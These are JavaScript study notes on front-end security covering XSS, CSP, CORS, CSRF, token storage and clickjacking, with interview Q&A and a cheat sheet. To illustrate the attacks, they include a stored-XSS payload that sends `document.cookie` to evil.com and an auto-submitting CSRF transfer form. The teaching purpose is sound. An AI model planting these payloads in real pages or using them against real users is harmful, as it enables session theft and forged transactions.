# JavaScript Study Notes — Part 33

## Front-End Security — XSS, CSP, CORS, CSRF, Clickjacking, Token Storage ⭐⭐⭐⭐⭐

**Topics:** XSS — the three kinds and how to prevent each · Content Security Policy · CORS from the browser's point of view · CSRF and `SameSite` cookies · where to store tokens · clickjacking · `rel="noopener"` · third-party scripts & Subresource Integrity · `postMessage` origin checks.

> **Why this part exists:** front-end developers are asked these constantly, and the server side is covered in [nodejs Part 7](../nodejs/07-authentication-and-security.md) and [Part 7.5](../nodejs/07.5-security-beyond-auth.md). This is the browser side — what *your* JavaScript, HTML and headers must do.
>
> **The one idea behind most of it:** the browser trusts everything that runs **on your origin**. Attacks try to either get *their* code running on your origin (XSS) or make the browser use *your* user's credentials on *their* behalf (CSRF, clickjacking).

---

## 1. XSS — Cross-Site Scripting

> **Definition:** an attacker gets their JavaScript to run **on your site, in another user's browser.** That script can then do anything the user can: read the page, read non-`HttpOnly` cookies and `localStorage`, call your API as them, change what they see.

> **Analogy 🎭 — a fake staff member in a uniform.** Once inside the shop wearing your uniform, customers trust them completely. XSS is the attacker's code wearing your site's uniform.

**The three kinds:**

| Kind | How the script gets in | Example |
|---|---|---|
| **Stored** | saved in your database, shown to everyone | a comment containing `<img src=x onerror="fetch('//evil.com?c='+document.cookie)">` |
| **Reflected** | in the URL, echoed back by the server | `/search?q=<script>…</script>` shown as "Results for …" |
| **DOM-based** | your own JavaScript puts URL/user data into the page unsafely | `el.innerHTML = location.hash.slice(1)` |

**How to prevent it:**

1. **Treat user data as text, not HTML.**
   ```js
   el.textContent = comment;        // ✅ always safe
   el.innerHTML = comment;          // ❌ parses HTML
   ```
   React (`{comment}`), Angular (`{{ comment }}`) and Vue escape by default. The danger zones are the escape hatches: React's `dangerouslySetInnerHTML`, Angular's `bypassSecurityTrustHtml`, Vue's `v-html`.
2. **If you must render user HTML** (a rich-text editor), **sanitize** it with an allow-list library: `DOMPurify.sanitize(html)`. Never write your own sanitizer with regexes.
3. **Dangerous places besides `innerHTML`:** `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout('string')`, and URLs — `<a href={userUrl}>` with `javascript:alert(1)`. Allow only `http:`/`https:` for user-supplied links.
4. **Add a Content Security Policy** (§2) as a second layer.
5. **`HttpOnly` cookies** for session tokens, so even a successful XSS can't *read* them (§5).

> Note: a `<script>` tag inserted via `innerHTML` doesn't run — attackers use event-handler attributes like `onerror` instead ([Part 21](21-dom-manipulation-and-event-delegation.md)).

---

## 2. Content Security Policy (CSP)

> **Definition:** a response header that tells the browser **which sources of scripts, styles, images, frames, etc. are allowed** on this page. Anything else is blocked — so even if an attacker injects a script, the browser refuses to run it.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  style-src 'self';
  img-src 'self' https://cdn.example.com data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self'
```

- **Inline scripts and `eval` are blocked by default** — which is the point, since injected code is usually inline. Allow your own inline scripts with a per-request random **nonce** (`<script nonce="r4nd0m">`) or a hash. Avoid `'unsafe-inline'` and `'unsafe-eval'` — they switch the protection off.
- `frame-ancestors 'none'` also prevents clickjacking (§6).
- Roll it out safely with **`Content-Security-Policy-Report-Only`** first: violations are reported, nothing is blocked.
- In Express, `helmet()` sets a CSP ([nodejs Part 6](../nodejs/06-http-and-express.md)).

> 🧠 **Remember:** escaping stops XSS getting *in*; CSP stops it *running*. Use both.

---

## 3. CORS — from the browser's side

> **Definition:** the **same-origin policy** stops JavaScript on `https://app.com` from **reading** responses from a different origin (`https://api.other.com`) — origin = scheme + host + port. **CORS** is how the *server* says "this other origin is allowed to read my responses."

```
Browser (on https://app.com) → GET https://api.example.com/data
                              ← Access-Control-Allow-Origin: https://app.com   → JS can read it ✅
                              ← (no such header)                               → "CORS error" in the console
```

**Preflight:** for "non-simple" requests — methods like `PUT`/`DELETE`, a JSON `Content-Type`, custom headers like `Authorization` — the browser first sends an **`OPTIONS`** request asking permission, then the real request.

**Cookies across origins** need both sides: `fetch(url, { credentials: 'include' })` **and** the server sending `Access-Control-Allow-Credentials: true` with an **exact** origin (never `*`).

The points that interviewers probe:
- **CORS is enforced by the browser, configured on the server.** You can't fix a CORS error in front-end code — the API must send the headers (or you route through a proxy on your own origin, e.g. the dev server's proxy).
- **CORS doesn't protect the server.** `curl` and other servers ignore it. It protects **users**, by stopping other websites' JavaScript from reading their data with their cookies.
- A CORS error usually still means **the request reached the server** — only the *response* was hidden from your JS. That's why CORS alone doesn't stop CSRF (§4).

---

## 4. CSRF — Cross-Site Request Forgery

> **Definition:** while you're logged in to `bank.com`, a page on `evil.com` makes your browser send a request to `bank.com` — and the browser **attaches your cookies automatically**, so the bank thinks it's really you.

```html
<!-- on evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="50000">
</form>
<script>document.forms[0].submit()</script>
```

The attacker never sees your cookie — they just get the browser to *use* it.

**Defences:**
1. **`SameSite` cookies** — the main modern defence:
   - `SameSite=Lax` (the default in modern browsers): cookies are **not** sent on cross-site POSTs, iframes or fetches — only on top-level navigation links. Blocks the form above.
   - `SameSite=Strict`: never sent cross-site, even when following a link (users arrive "logged out" from external links).
   - `SameSite=None; Secure`: always sent — only for genuine cross-site needs (embedded widgets), and then you need other defences.
2. **CSRF tokens** — a random value in the form/header that `evil.com` can't read.
3. **Check the `Origin` header** on state-changing requests.
4. **Never change data with `GET`** requests.

**Token in an `Authorization: Bearer` header?** Not vulnerable to CSRF — the browser never adds it automatically; your JS has to. (But then the token is readable by JS → XSS risk. That's the trade-off in §5.)

---

## 5. Where to store tokens

| Storage | Readable by JS (so by XSS)? | Sent automatically (so CSRF risk)? | Notes |
|---|---|---|---|
| `localStorage` / `sessionStorage` | **yes** ❌ | no | any XSS can steal it and use it from anywhere |
| JS memory (a variable) | yes, but only while the page is open | no | lost on refresh — pair with a refresh cookie |
| **`HttpOnly; Secure; SameSite` cookie** | **no** ✅ | yes → handled by `SameSite` + CSRF defences | the usual recommendation for browser apps |

The common robust setup: **access token in memory** (short-lived, sent as `Bearer`), **refresh token in an `HttpOnly` `SameSite` cookie** sent only to `/auth/refresh` ([nodejs Part 7 §5](../nodejs/07-authentication-and-security.md)).

> 🧠 **Remember:** **`localStorage` is readable by every script on the page — never put secrets there.** And no storage choice survives XSS fully: an attacker running on your page can still *call your API as the user*. Preventing XSS comes first.

Cookie flags recap: `HttpOnly` (JS can't read), `Secure` (HTTPS only), `SameSite` (cross-site rules), `Path`/`Domain` (scope), `Max-Age`/`Expires`.

---

## 6. Clickjacking

> **Definition:** an attacker loads your site in an **invisible iframe** on their page and tricks users into clicking your buttons ("Delete account", "Transfer") while thinking they're clicking something else.

**Fix (on the server):** forbid other sites from framing you:
- `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) — modern.
- `X-Frame-Options: DENY` — older equivalent, still widely sent.

---

## 7. Smaller things that matter

- **`target="_blank"` links:** the opened page gets `window.opener` and could redirect your tab to a phishing page ("tabnabbing"). Add **`rel="noopener noreferrer"`** — modern browsers apply `noopener` by default for `_blank`, but say it in interviews and keep it for older browsers.
- **Third-party scripts** (analytics, chat widgets, CDNs) run with **full access to your page**. Load as few as possible; pin versions; use **Subresource Integrity** so a tampered CDN file is refused:
  ```html
  <script src="https://cdn.example.com/lib@4.2.0.min.js"
          integrity="sha384-…" crossorigin="anonymous"></script>
  ```
- **`postMessage`:** always check `event.origin` when receiving and name the exact target origin when sending ([Part 20 §7](20-browser-apis.md)).
- **Open redirects:** `/login?next=https://evil.com` — only allow relative paths or a known list for `next`.
- **Secrets in front-end code aren't secret.** Anything in your JS bundle (API keys, "hidden" admin routes) can be read by anyone. Only public keys belong there; real secrets stay on the server.
- **Validation in the browser is for UX, not security.** Attackers skip your form and call the API directly — the server must validate everything ([nodejs Part 7.5](../nodejs/07.5-security-beyond-auth.md)).
- **HTTPS everywhere** + `Strict-Transport-Security` (HSTS) header.

---

## Interview Q&A

**Q: What is XSS and how do you prevent it?**
> An attacker gets their JavaScript to run on your site in another user's browser — through stored content, a reflected URL parameter, or your own code inserting untrusted data into the DOM. Prevent it by rendering user data as text (`textContent`, or the framework's default escaping), sanitizing any HTML you must render with DOMPurify, avoiding `innerHTML`/`eval` and `javascript:` URLs, adding a strict CSP, and using `HttpOnly` cookies so tokens can't be read.

**Q: What does CSP do?**
> It's a response header listing allowed sources for scripts, styles, images, connections and frames. The browser blocks everything else, including inline scripts and `eval` by default, so injected code doesn't run even if it gets into the page. Allow your own inline scripts with nonces, and roll it out in report-only mode first.

**Q: You get a CORS error calling an API. How do you fix it?**
> CORS is enforced by the browser but configured on the server, so the API must return `Access-Control-Allow-Origin` for my origin — plus `Allow-Credentials` and an exact origin if cookies are involved, and correct responses to the `OPTIONS` preflight. In development, a dev-server proxy on my own origin works. It can't be fixed from front-end code alone.

**Q: What's CSRF, and how does `SameSite` help?**
> A malicious site makes the user's browser send a request to my site, and the browser attaches the user's cookies automatically. `SameSite=Lax` (the browser default now) stops cookies being sent on cross-site POSTs and background requests, which blocks most CSRF. For extra safety: CSRF tokens, checking the `Origin` header, and never changing data with GET.

**Q: Where should a browser app store its auth token?**
> Not in `localStorage` — any XSS can read it. Usually an `HttpOnly`, `Secure`, `SameSite` cookie, or a short-lived access token kept in memory with the refresh token in an `HttpOnly` cookie. Cookies bring CSRF into play, which `SameSite` and CSRF tokens handle.

**Q: How do you stop your site being embedded in someone else's iframe?**
> Send `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) and, for older browsers, `X-Frame-Options: DENY`. That prevents clickjacking.

---

## Follow-ups (challenge questions)

- *Failure mode:* a support chat widget from a third-party CDN is compromised and starts sending form inputs to another domain. Which of SRI, CSP `connect-src`, and pinned versions would have stopped it, and which wouldn't?
- *Consistency:* the app moves its API to `api.example.com` while the front-end stays on `app.example.com`. Which cookie settings, CORS headers and `SameSite` values must change, and what's "same-site" vs "same-origin" here?

---

## Cheat Sheet

```
XSS = attacker's JS runs on YOUR origin ("fake staff in your uniform")
  stored · reflected · DOM-based
  → textContent / framework escaping · DOMPurify for HTML · no innerHTML/eval/javascript: URLs
  → CSP · HttpOnly cookies
CSP header = allow-list of sources · blocks inline + eval · nonces · Report-Only first
  "escaping stops it getting IN, CSP stops it RUNNING"

CORS = server says who may READ responses · enforced by browser · fix on SERVER (or dev proxy)
  preflight OPTIONS for PUT/DELETE/JSON/Authorization · credentials → exact origin + Allow-Credentials
  doesn't protect the server; request may still reach it

CSRF = other site makes browser send YOUR cookies
  → SameSite=Lax (default) / Strict · CSRF token · check Origin · no state change on GET
  Bearer header → no CSRF (but JS-readable → XSS risk)

TOKENS: not localStorage · HttpOnly+Secure+SameSite cookie · or access in memory + refresh in HttpOnly cookie
CLICKJACKING → frame-ancestors 'none' / X-Frame-Options: DENY
also: rel="noopener" · SRI for CDN scripts · check postMessage origin · no open redirects
      no secrets in bundles · client validation = UX only · HTTPS + HSTS
```

---

**Previous:** [Part 32 — Browser Rendering & Loading](32-browser-rendering-and-loading.md) · **Next:** [Part 34 — Async Iteration](34-async-iteration.md)
